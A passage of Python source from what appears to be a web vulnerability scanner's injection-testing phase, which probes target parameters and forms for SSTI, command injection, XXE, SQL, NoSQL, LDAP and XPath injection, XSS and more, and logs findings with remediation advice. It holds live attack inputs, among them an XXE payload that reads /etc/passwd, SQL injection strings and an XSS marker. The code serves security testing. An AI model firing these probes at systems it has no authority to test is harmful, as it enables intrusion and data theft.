                        title="Server-Side Template Injection (SSTI)",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is evaluated as template syntax by a server-side template engine (e.g., Jinja2, Twig, Freemarker), enabling arbitrary server-side code execution.",
                        output=f"Parameter: {param}\nPayload: {payload} → {expected}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Never pass user input directly to template rendering functions; treat user data as context variables only and use sandboxed or logic-less template engines where user-controlled content must appear in templates.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] SSTI: {purl} param={param}", "SUCCESS")

    # 5b. SSTImap — dedicated SSTI scanner with engine-specific payloads
    vc.status(phase, "Injection Testing", "running", "SSTImap", 5, 28)
    sstimap_bin = _find_tool("sstimap") or _find_tool("SSTImap") or _find_tool("sstimap.py")
    if sstimap_bin and params:
        _sstimap_dir = out.root / phase / "sstimap"
        _sstimap_dir.mkdir(parents=True, exist_ok=True)
        _sstimap_found_params: set = set()
        for entry in params[:8]:
            purl = entry["url"]
            for param in entry["params"][:5]:
                _sstikey = (purl, param)
                if _sstikey in _sstimap_found_params:
                    continue
                _sstimap_out = _sstimap_dir / f"sstimap_{param}.txt"
                _sstimap_cmd = [sstimap_bin, "-u", f"{purl}?{param}=INJECT",
                                "--level", "2", "--no-color"]
                try:
                    proc = _popen(_sstimap_cmd, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, text=True)
                    _register_proc(proc)
                    _ssti_stdout, _ssti_stderr = proc.communicate(timeout=120)
                    _deregister_proc(proc)
                    _sstimap_out.write_text(_ssti_stdout, encoding="utf-8")
                    out.log_command("sstimap", _sstimap_cmd, _sstimap_out)
                    _ssti_confirmed = bool(re.search(
                        r'(?:Confirmed|confirmed|Exploitable|exploitable)',
                        _ssti_stdout, re.I))
                    _ssti_identified = bool(re.search(
                        r'(?:Identified|identified|Detected|detected)\s.*?engine',
                        _ssti_stdout, re.I))
                    _engine_m = re.search(
                        r'(?:Engine|Template)[\s:]+([A-Za-z0-9_. ]+)',
                        _ssti_stdout, re.I)
                    _engine_name = _engine_m.group(1).strip() if _engine_m else "Unknown"
                    if _ssti_confirmed:
                        _sstimap_found_params.add(_sstikey)
                        out.add_finding(
                            title="Server-Side Template Injection (SSTI) — SSTImap Confirmed",
                            url=purl, port=target["port"], risk="CRITICAL",
                            description=(
                                f"SSTImap confirmed SSTI in parameter '{param}' at {purl}. "
                                f"Template engine: {_engine_name}. Server-side template "
                                f"injection allows arbitrary code execution on the server."
                            ),
                            output=_ssti_stdout[:2000],
                            output_file=str(_sstimap_out),
                            sources="sstimap", service=target["scheme"],
                            affected=purl, owasp="A03:2025 Injection",
                            nist="SI-10",
                            remediation=(
                                "Never pass user input directly to template rendering "
                                "functions. Use sandboxed or logic-less template engines. "
                                "Treat user data as context variables only."
                            ),
                        )
                        vc.log(f"[injection] SSTImap confirmed SSTI: {purl} "
                               f"param={param} engine={_engine_name}", "SUCCESS")
                    elif _ssti_identified:
                        _sstimap_found_params.add(_sstikey)
                        out.add_finding(
                            title="SSTI — Template Engine Identified",
                            url=purl, port=target["port"], risk="MEDIUM",
                            description=(
                                f"SSTImap identified a template engine ({_engine_name}) "
                                f"processing parameter '{param}' at {purl}, but could not "
                                f"confirm exploitable injection. Manual testing is advised."
                            ),
                            output=_ssti_stdout[:2000],
                            output_file=str(_sstimap_out),
                            sources="sstimap", service=target["scheme"],
                            affected=purl, owasp="A03:2025 Injection",
                            nist="SI-10",
                            remediation=(
                                "Investigate the identified template engine. Ensure user "
                                "input cannot influence template syntax. Apply sandboxing."
                            ),
                        )
                        vc.log(f"[injection] SSTImap identified engine: {purl} "
                               f"param={param} engine={_engine_name}", "WARNING")
                except Exception as e:
                    out.log_error("sstimap", _sstimap_cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "Command injection", 6, 28)
    # 6. Command injection
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for cmd_pay, cmd_pat in _CMD_PAYLOADS:
                r = _qs_inject(purl, param, "test" + cmd_pay, sess, timeout)
                if r and cmd_pat.search(r.text):
                    _rq, _rp = _save_http_evidence(out, phase, f"cmdi_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="OS Command Injection",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is passed unsanitised to a system shell or OS command execution function, allowing an attacker to execute arbitrary commands on the host.",
                        output=f"Parameter: {param}\nPayload: {cmd_pay}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Eliminate shell calls that incorporate user input; use language-native library functions instead; where shell invocation is unavoidable, apply strict allowlist validation on all input values.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] CMDi: {purl} param={param}", "SUCCESS")

    # 6b. commix — dedicated OS command injection scanner
    vc.status(phase, "Injection Testing", "running", "commix", 7, 28)
    commix_bin = _find_tool("commix")
    if commix_bin and params:
        commix_dir = out.root / phase / "commix"
        commix_dir.mkdir(parents=True, exist_ok=True)
        _cmx_tested: set = set()
        for entry in params[:8]:
            purl = entry["url"]
            for param in entry["params"][:5]:
                _cmx_key = (purl, param)
                if _cmx_key in _cmx_tested:
                    continue
                _cmx_tested.add(_cmx_key)
                _cmx_out = commix_dir / f"commix_{param}.txt"
                _cmx_cmd = [commix_bin, f"--url={purl}", "-p", param,
                            "--batch", f"--output-dir={commix_dir}",
                            "--level=2"]
                vc.log(f"[injection] Running commix on {purl} param={param} ...", "INFO")
                try:
                    proc = _popen(_cmx_cmd, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, text=True)
                    _register_proc(proc)
                    _cmx_stdout, _cmx_stderr = proc.communicate(timeout=180)
                    _deregister_proc(proc)
                    _cmx_out.write_text(_cmx_stdout, encoding="utf-8")
                    out.log_command("commix", _cmx_cmd, _cmx_out)
                    _cmx_vuln = bool(re.search(
                        r'is\s+vulnerable|injection\s+point|injectable',
                        _cmx_stdout, re.I))
                    _cmx_blind = bool(re.search(
                        r'time-based|blind.*injection|blind.*technique',
                        _cmx_stdout, re.I))
                    if _cmx_vuln and not _cmx_blind:
                        out.add_finding(
                            title="OS Command Injection — commix Confirmed",
                            url=purl, port=target["port"], risk="CRITICAL",
                            description=(
                                f"commix confirmed OS command injection in parameter "
                                f"'{param}' at {purl}. An attacker can execute arbitrary "
                                f"system commands on the host operating system."
                            ),
                            output=_cmx_stdout[:2000],
                            output_file=str(_cmx_out),
                            sources="commix", service=target["scheme"],
                            affected=purl, owasp="A03:2025 Injection",
                            nist="SI-10",
                            remediation=(
                                "Eliminate shell calls that incorporate user input. "
                                "Use language-native library functions. Apply strict "
                                "allowlist validation on all input values."
                            ),
                        )
                        vc.log(f"[injection] commix confirmed CMDi: {purl} param={param}", "SUCCESS")
                    elif _cmx_blind:
                        out.add_finding(
                            title="Blind Command Injection (Time-Based) — commix",
                            url=purl, port=target["port"], risk="HIGH",
                            description=(
                                f"commix detected time-based blind command injection in "
                                f"parameter '{param}' at {purl}. The server's response "
                                f"delay indicates user input reaches a shell execution "
                                f"function, though output is not directly returned."
                            ),
                            output=_cmx_stdout[:2000],
                            output_file=str(_cmx_out),
                            sources="commix", service=target["scheme"],
                            affected=purl, owasp="A03:2025 Injection",
                            nist="SI-10",
                            remediation=(
                                "Eliminate shell calls that incorporate user input. "
                                "Use language-native library functions. Apply strict "
                                "allowlist validation on all input values."
                            ),
                        )
                        vc.log(f"[injection] commix blind CMDi: {purl} param={param}", "WARNING")
                except Exception as e:
                    out.log_error("commix", _cmx_cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "CRLF", 8, 28)
    # 7. CRLF injection
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            r = _qs_inject(purl, param, _CRLF_PAYLOAD, sess, timeout)
            if r and "X-Injected-Fracture" in str(r.headers):
                _rq, _rp = _save_http_evidence(out, phase, f"crlf_{param}", r, endpoint_url=purl, method="GET")
                out.add_finding(
                    title="CRLF Injection",
                    url=purl, port=target["port"], risk="MEDIUM",
                    description="User-supplied carriage-return and line-feed characters are reflected into HTTP response headers, allowing an attacker to inject arbitrary headers, split responses, or set malicious cookies.",
                    output=f"Parameter: {param}\nPayload: {_CRLF_PAYLOAD}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Filter or reject CR (\\r) and LF (\\n) characters from any user-supplied value before it is written into an HTTP response header; use framework-level header APIs that prevent raw header injection.",
                    http_code=r.status_code,
                )

    vc.status(phase, "Injection Testing", "running", "XXE", 9, 28)
    # 8. XXE — test on forms that might accept XML
    _xxe_payload = ('<?xml version="1.0"?><!DOCTYPE foo '
                    '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<foo>&xxe;</foo>')
    for form in forms[:10]:
        action = form.get("action", url)
        try:
            r = sess.post(action, data=_xxe_payload, timeout=timeout,
                          headers={"Content-Type": "application/xml"})
            if re.search(r'root:.*:/bin/', r.text):
                _rq, _rp = _save_http_evidence(out, phase, "xxe", r, endpoint_url=action, method="POST")
                out.add_finding(
                    title="XML External Entity (XXE) Injection",
                    url=action, port=target["port"], risk="CRITICAL",
                    description=f"XXE injection confirmed at {action}. /etc/passwd content was returned.",
                    output=r.text[:500],
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    affected=action, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Disable external entity processing in XML parsers.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] XXE at {action}", "SUCCESS")
        except Exception:
            pass

    # 9. Second-order SQL injection
    vc.status(phase, "Injection Testing", "running", "Second-order SQLi", 10, 28)
    for form in forms[:5]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or inp.get("type") in ("hidden", "submit", "button"):
                continue
            data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
            data[pname] = "fracture_so_sqli'"
            try:
                sess.post(action, data=data, timeout=timeout)
                r2 = sess.get(action, timeout=timeout)
                if r2 and _SQL_ERROR_RE.search(r2.text):
                    _rq, _rp = _save_http_evidence(out, phase, f"sqli_so_{pname}", r2, endpoint_url=action, method="POST")
                    out.add_finding(
                        title="Second-Order SQL Injection",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=(f"Second-order SQL injection detected via field '{pname}' at {action}. "
                                     f"A quote character stored in the field triggered a SQL error on the "
                                     f"next retrieval, indicating the stored value is interpolated unsafely."),
                        output=f"Field: {pname}\nStore payload: fracture_so_sqli'\nSQL error on retrieval",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use parameterised queries for all database operations, including reads of stored values.",
                        http_code=r2.status_code,
                    )
                    vc.log(f"[injection] Second-order SQLi at {action} field={pname}", "SUCCESS")
                    break
            except Exception:
                pass

    # 10. CSV / formula injection
    vc.status(phase, "Injection Testing", "running", "CSV injection", 11, 28)
    _csv_found_forms: set = set()
    for form in forms[:15]:
        action = form.get("action", url)
        if action in _csv_found_forms:
            continue
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or inp.get("type") in ("hidden", "submit", "button", "password"):
                continue
            data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
            data[pname] = _CSV_INJECT_PAYLOADS[0]
            try:
                r = sess.post(action, data=data, timeout=timeout)
                _csv_marker = "fracture'!A0"
                _csv_body = r.text if r else ""
                _csv_body = re.sub(
                    r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                    + re.escape(urllib.parse.quote(_csv_marker, safe=''))
                    + r'[^"\']*["\']',
                    '', _csv_body, flags=re.I)
                if (r and r.status_code in (200, 201, 302)
                        and _csv_marker in urllib.parse.unquote(_csv_body)):
                    _csv_found_forms.add(action)
                    _rq, _rp = _save_http_evidence(out, phase, f"csv_{pname}", r, endpoint_url=action, method="POST")
                    out.add_finding(
                        title="CSV / Formula Injection",
                        url=action, port=target["port"], risk="HIGH",
                        description=(f"Input field '{pname}' at {action} accepted a formula injection payload "
                                     f"({_CSV_INJECT_PAYLOADS[0]!r}). If this data is exported to a CSV or "
                                     f"spreadsheet, the formula may execute commands on the recipient's workstation."),
                        output=f"Field: {pname}\nPayload: {_CSV_INJECT_PAYLOADS[0]}\nResponse: {r.status_code}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
                        remediation=(
                            "Sanitise all text inputs before CSV/Excel export. "
                            "Prefix cells beginning with =, +, -, @ with a single-quote character."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] CSV injection at {action} field={pname}", "SUCCESS")
                    break
            except Exception:
                pass

    # 11. NoSQL injection
    vc.status(phase, "Injection Testing", "running", "NoSQL injection", 12, 28)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for nosql_pay, nosql_err in _NOSQL_PAYLOADS:
                r = _qs_inject(purl, param, nosql_pay, sess, timeout)
                _nosql_body = _strip_url_echo(r.text, r, [nosql_pay]) if r else ""
                if r and _inj_is_login_page(r):
                    continue
                if r and nosql_err.search(_nosql_body):
                    _rq, _rp = _save_http_evidence(out, phase, f"nosql_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="NoSQL Injection",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-supplied input is incorporated into NoSQL query documents without type or operator validation, allowing an attacker to manipulate query logic and bypass authentication or exfiltrate data.",
                        output=f"Parameter: {param}\nPayload: {nosql_pay}\nResponse ({r.status_code}): {r.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use parameterised query APIs or ODM/ORM frameworks that reject user-supplied operator tokens; enforce strict type validation on all inputs used in query construction.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] NoSQL injection: {purl} param={param}", "SUCCESS")
                    break

    # 12. LDAP injection — baseline-gated (same pattern as SQLi).
    # The LDAP error regexes include terms like "objectClass" which can
    # appear in normal page content.  A baseline fetch without the payload
    # must NOT match the regex for the finding to fire.
    vc.status(phase, "Injection Testing", "running", "LDAP injection", 13, 28)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            # Baseline: fetch with a harmless value
            try:
                _ldap_bl = _qs_inject(purl, param, "test", sess, timeout)
            except Exception:
                _ldap_bl = None
            _ldap_bl_body = _strip_url_echo(_ldap_bl.text, _ldap_bl, ["test"]) if _ldap_bl else ""
            for ldap_pay, ldap_err in _LDAP_PAYLOADS:
                # Skip if the baseline already matches the error regex
                # (page contains LDAP-like keywords regardless of input)
                if _ldap_bl and ldap_err.search(_ldap_bl_body):
                    continue
                r = _qs_inject(purl, param, ldap_pay, sess, timeout)
                _ldap_body = _strip_url_echo(r.text, r, [ldap_pay]) if r else ""
                _ldap_body = re.sub(
                    r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                    + re.escape(ldap_pay)
                    + r'[^"\']*["\']',
                    '', _ldap_body, flags=re.I)
                if r and _inj_is_login_page(r):
                    continue
                if not r or not ldap_err.search(_ldap_body):
                    continue
                # Response must differ meaningfully from baseline — if the
                # page renders identically (same length ±5%), the server
                # ignored the payload entirely.
                if _ldap_bl and abs(len(r.text) - len(_ldap_bl.text)) < max(50, len(_ldap_bl.text) * 0.05):
                    continue
                _rq, _rp = _save_http_evidence(out, phase, f"ldap_{param}", r, endpoint_url=purl, method="GET")
                out.add_finding(
                    title="LDAP Injection",
                    url=purl, port=target["port"], risk="HIGH",
                    description="User-supplied input is concatenated into LDAP search filters without proper escaping, allowing an attacker to manipulate query logic, bypass authentication, or enumerate directory contents.",
                    output=f"Parameter: {param}\nPayload: {ldap_pay}\nResponse ({r.status_code}): {r.text[:300]}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Escape all user-supplied values using RFC 4515-compliant LDAP encoding before incorporating them into LDAP filter strings.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] LDAP injection: {purl} param={param}", "SUCCESS")
                break

    # 13. XPath injection
    vc.status(phase, "Injection Testing", "running", "XPath injection", 14, 28)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for xpath_pay, xpath_err in _XPATH_PAYLOADS:
                r = _qs_inject(purl, param, xpath_pay, sess, timeout)
                if r and xpath_err.search(r.text):
                    _rq, _rp = _save_http_evidence(out, phase, f"xpath_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="XPath Injection",
                        url=purl, port=target["port"], risk="HIGH",
                        description=(f"XPath injection detected in parameter '{param}' with payload "
                                     f"'{xpath_pay}'. Error response reveals XPath expression construction."),
                        output=f"Parameter: {param}\nPayload: {xpath_pay}\nResponse ({r.status_code}): {r.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use a parameterised XPath API. Never concatenate user input into XPath expressions.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] XPath injection: {purl} param={param}", "SUCCESS")
                    break

    # 14. Log injection
    vc.status(phase, "Injection Testing", "running", "Log injection", 15, 28)
    _log_found: set = set()
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            if purl in _log_found:
                continue
            r = _qs_inject(purl, param, _LOG_INJECT_PAYLOAD, sess, timeout)
            _log_body = _strip_url_echo(r.text, r, [_LOG_INJECT_PAYLOAD, "fracture_log_inject_SUCCESS"]) if r else ""
            if r and "fracture_log_inject_SUCCESS" in urllib.parse.unquote(_log_body):
                _log_found.add(purl)
                _rq, _rp = _save_http_evidence(out, phase, f"loginject_{param}", r, endpoint_url=purl, method="GET")
                out.add_finding(
                    title="Log Injection / CRLF in Log Entries",
                    url=purl, port=target["port"], risk="MEDIUM",
                    description=(f"Parameter '{param}' at {purl} accepted a newline-embedded log injection "
                                 f"payload. If the server logs this input without sanitisation, an attacker "
                                 f"can inject fake log entries to mislead forensic analysis."),
                    output=f"Parameter: {param}\nPayload: {repr(_LOG_INJECT_PAYLOAD)}\nResponse: {r.status_code}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    affected=purl, owasp="A03:2025 Injection", nist="AU-3",
                    remediation="Strip CRLF/newline characters from all inputs written to logs. Use a structured logging library.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] Log injection accepted: {purl} param={param}", "SUCCESS")
                break

    # 15. HTTP Parameter Pollution
    vc.status(phase, "Injection Testing", "running", "HTTP Parameter Pollution", 16, 28)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            try:
                parsed_u = urllib.parse.urlparse(purl)
                hpp_qs   = f"{param}=legitimate&{param}=fracture_hpp_probe"
                hpp_url  = parsed_u._replace(query=hpp_qs).geturl()
                r = sess.get(hpp_url, timeout=timeout)
                if r and r.status_code == 200:
                    _hpp_body = r.text
                    for _strip in (r.url, hpp_url,
                                   urllib.parse.unquote(hpp_url),
                                   urllib.parse.unquote_plus(hpp_url)):
                        _hpp_body = _hpp_body.replace(_strip, "")
                    # Strip the probe marker from URL-type attribute values (href/src/action/content).
                    # CMSes such as WordPress propagate the resolved parameter value into pagination
                    # and navigation link hrefs — this is URL echo, not HPP exploitation.
                    _hpp_body = re.sub(
                        r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                        r'fracture_hpp_probe[^"\']*["\']',
                        '', _hpp_body, flags=re.I)
                    if "fracture_hpp_probe" in _hpp_body:
                        _rq, _rp = _save_http_evidence(out, phase, f"hpp_{param}", r, endpoint_url=purl, method="GET")
                        out.add_finding(
                            title="HTTP Parameter Pollution (HPP)",
                            url=purl, port=target["port"], risk="MEDIUM",
                            description=(f"Parameter '{param}' is vulnerable to HTTP Parameter Pollution. "
                                         f"Sending the parameter twice caused the second value to be reflected, "
                                         f"indicating the application processes duplicated parameters inconsistently."),
                            output=f"Parameter: {param}\nTest URL: {hpp_url}\nSecond value reflected in response",
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-injection", service=target["scheme"],
                            affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                            remediation="Define explicit single-value semantics for all parameters. Reject or normalise duplicate query parameters.",
                            http_code=r.status_code,
                        )
                        vc.log(f"[injection] HPP: {purl} param={param}", "SUCCESS")
                        break
            except Exception:
                pass

    # 16. Code injection / eval() RCE probe
    vc.status(phase, "Injection Testing", "running", "Code injection", 17, 28)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for ci_pay, ci_pat in _code_inject_probes():
                r = _qs_inject(purl, param, ci_pay, sess, timeout)
                if not r:
                    continue
                # Strip the full request URL and its decoded forms first —
                # canonical link tags and self-referential hrefs embed the
                # URL-encoded payload, which would otherwise match the
                # execution marker as part of the URL string.
                _ci_body = r.text
                for _strip in (r.url,
                               urllib.parse.unquote(r.url),
                               urllib.parse.unquote_plus(r.url)):
                    _ci_body = _ci_body.replace(_strip, "")
                # Also strip the raw payload and all URL-encoded variants.
                for _enc in (ci_pay,
                             urllib.parse.quote(ci_pay, safe=''),
                             urllib.parse.quote_plus(ci_pay)):
                    _ci_body = _ci_body.replace(_enc, "")
                # Strip any URL that embeds the execution marker — the page may
                # reflect the submitted URL with a different percent-encoding
                # (e.g. + vs %20, truncated fragment) that the above replaces miss.
                # A marker appearing only inside a URL is not code execution.
                _pat_core = re.escape(ci_pat.pattern.replace('\\b', ''))
                if _pat_core:
                    _ci_body = re.sub(
                        r'https?://[^\s<>"\']*' + _pat_core + r'[^\s<>"\']*',
                        '', _ci_body, flags=re.I)
                    _ci_body = re.sub(
                        r'\?[^\s<>"\']*' + _pat_core + r'[^\s<>"\']*',
                        '', _ci_body, flags=re.I)
                    _ci_body = re.sub(
                        r'(?:href|src|action|content)(?:\s*)=(?:\s*)["\'][^"\']*'
                        + _pat_core + r'[^"\']*["\']',
                        '', _ci_body, flags=re.I)
                if ci_pat.search(_ci_body):
                    _rq, _rp = _save_http_evidence(out, phase, f"codeinject_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="Remote Code Execution via Code Injection",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description=(f"Code injection confirmed in parameter '{param}' at {purl}. "
                                     f"Payload '{ci_pay}' was evaluated server-side, indicating the "
                                     f"application passes user input to eval() or an equivalent."),
                        output=f"Parameter: {param}\nPayload: {ci_pay}\nResponse: {r.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Never pass user-controlled input to eval(), exec(), or similar functions. Use safe alternatives.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] Code injection RCE: {purl} param={param}", "SUCCESS")
                    break

    # 17. Stored XSS
    vc.status(phase, "Injection Testing", "running", "Stored XSS", 18, 28)
    _stored_xss_marker = "<img/src=x id=fracture_sxss>"
    _stored_xss_found: set = set()
    for form in forms[:10]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        text_inputs = [i for i in inputs if i.get("type", "text") in ("text", "textarea", "search", "")
                       and i.get("name")]
        if not text_inputs:
            continue
        for inp in text_inputs:
            if action in _stored_xss_found:
                break
            pname = inp["name"]
            data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
            data[pname] = _stored_xss_marker
            try:
                sess.post(action, data=data, timeout=timeout)
                # Fetch page most likely to display stored content
                for check_url in [action, url, url + "/dashboard", url + "/profile"]:
                    r2 = sess.get(check_url, timeout=timeout)
                    if r2 and "fracture_sxss" in r2.text:
                        _stored_xss_found.add(action)
                        _rq, _rp = _save_http_evidence(out, phase, f"sxss_{pname}", r2, endpoint_url=action, method="POST")
                        _sxss_ss = _capture_xss_screenshot(
                            check_url, out, phase, f"stored_xss_{pname}",
                            target, cfg, auth_session=sess)
                        out.add_finding(
                            title="Stored Cross-Site Scripting (XSS)",
                            url=action, port=target["port"], risk="CRITICAL",
                            description="User-controlled input is reflected or stored and rendered in a browser context without proper encoding, enabling arbitrary script execution.",
                            output=f"Field: {pname}\nPayload: {_stored_xss_marker}\nReflected at: {check_url}",
                            output_file=f"{_rq},{_rp}" + (f",{_sxss_ss}" if _sxss_ss else ""),
                            sources="fracture-injection", service=target["scheme"],
                            affected=check_url, owasp="A03:2025 Injection", nist="SI-10",
                            remediation="Encode all output contextually (HTML, JS, URL, CSS), sanitise stored input server-side, and enforce a strict Content-Security-Policy.",
                            http_code=r2.status_code,
                        )
                        vc.log(f"[injection] Stored XSS at {action} field={pname}", "SUCCESS")
                        break
            except Exception:
                pass

    # 18. DOM-based XSS — static source analysis in discovered JS files
    vc.status(phase, "Injection Testing", "running", "DOM XSS (static)", 19, 28)
    _dom_sink_re = re.compile(
        r'(document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval\s*\(|'
        r'setTimeout\s*\(\s*["\']|setInterval\s*\(\s*["\']|location\.href\s*=|'
        r'location\.replace\s*\(|\.src\s*=)[^\n]{0,120}'
        r'(location\.search|location\.hash|location\.href|location\.pathname|'
        r'document\.URL|window\.name|document\.referrer|URLSearchParams)',
        re.I
    )
    _js_links = [lk for lk in crawl_data.get("links", []) if lk.endswith(".js")]
    for js_url in _js_links[:20]:
        try:
            r = sess.get(js_url, timeout=timeout)
            if r and r.status_code == 200 and _dom_sink_re.search(r.text):
                m = _dom_sink_re.search(r.text)
                _dom_ev = ""
                try:
                    _dom_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', js_url)[:50]
                    _dom_rq, _dom_rp = _save_http_evidence(
                        out, phase, f"dom_xss_{_dom_safe}", r)
                    _dom_ev = json.dumps(
                        [{"url": js_url, "req": str(_dom_rq), "resp": str(_dom_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title="DOM-Based Cross-Site Scripting (XSS)",
                    url=js_url, port=target["port"], risk="HIGH",
                    description="User-controlled input is reflected or stored and rendered in a browser context without proper encoding, enabling arbitrary script execution.",
                    output=f"Pattern found near: ...{m.group(0)[:200]}...",
                    sources="fracture-injection", service=target["scheme"],
                    output_file=_dom_ev,
                    affected=js_url, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Encode all output contextually (HTML, JS, URL, CSS), sanitise stored input server-side, and enforce a strict Content-Security-Policy.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] DOM XSS source/sink: {js_url}", "SUCCESS")
        except Exception:
            pass

    # 19. JSONP endpoint detection
    vc.status(phase, "Injection Testing", "running", "JSONP endpoints", 20, 28)
    _jsonp_wrap_re = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(', re.M)
    for entry in params[:15]:
        purl = entry["url"]
        for cb_param in _JSONP_CB_PARAMS:
            r = _qs_inject(purl, cb_param, "fracture_jsonp_cb", sess, timeout)
            if r and r.status_code == 200:
                ct = r.headers.get("content-type", "")
                _jsonp_body = _strip_url_echo(r.text, r, ["fracture_jsonp_cb"])
                if ("javascript" in ct or "json" in ct or _jsonp_wrap_re.search(_jsonp_body[:100])):
                    if "fracture_jsonp_cb" in _jsonp_body and _jsonp_wrap_re.search(_jsonp_body[:100]):
                        _jp_ev = ""
                        try:
                            _jp_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', purl)[:50]
                            _jp_rq, _jp_rp = _save_http_evidence(
                                out, phase, f"jsonp_{_jp_safe}", r)
                            _jp_ev = json.dumps(
                                [{"url": purl, "req": str(_jp_rq), "resp": str(_jp_rp)}])
                        except Exception:
                            pass
                        out.add_finding(
                            title="JSONP Endpoint — Cross-Origin Data Leakage",
                            url=purl, port=target["port"], risk="HIGH",
                            description=(f"JSONP endpoint detected at {purl}. The '{cb_param}' parameter "
                                         f"is reflected as a JavaScript callback function name, wrapping "
                                         f"the response. An attacker can use a <script> tag on any domain "
                                         f"to exfiltrate the response data."),
                            output=f"Parameter: {cb_param}\nCallback reflected: {r.text[:200]}",
                            sources="fracture-injection", service=target["scheme"],
                            output_file=_jp_ev,
                            affected=purl, owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                            remediation=(
                                "Remove JSONP support and use CORS instead. "
                                "If JSONP is required, validate the callback name against a strict whitelist."
                            ),
                            http_code=r.status_code,
                        )
                        vc.log(f"[injection] JSONP endpoint: {purl} param={cb_param}", "SUCCESS")
                        break

    # 20. Blind SQL injection — boolean-based
    vc.status(phase, "Injection Testing", "running", "Blind SQLi (boolean)", 21, 28)
    _bool_sqli_true  = "' OR '1'='1"
    _bool_sqli_false = "' OR '1'='2"
    for entry in params[:8]:
        purl = entry["url"]
        # Skip handler URLs whose params are never database-bound
        if _INJECTION_SKIP_URL_RE.search(purl):
            continue
        for param in entry["params"]:
            # Skip params that are never database-bound (Telerik, handlers)
            if param.lower() in _INJECTION_SKIP_PARAMS or param.startswith("_TSM_"):
                continue
            try:
                r_true  = _qs_inject(purl, param, _bool_sqli_true,  sess, timeout)
                r_false = _qs_inject(purl, param, _bool_sqli_false, sess, timeout)
                if (r_true and r_false
                        and r_true.status_code == 200
                        and r_false.status_code in (200, 302, 404)
                        and abs(len(r_true.text) - len(r_false.text)) > 50):
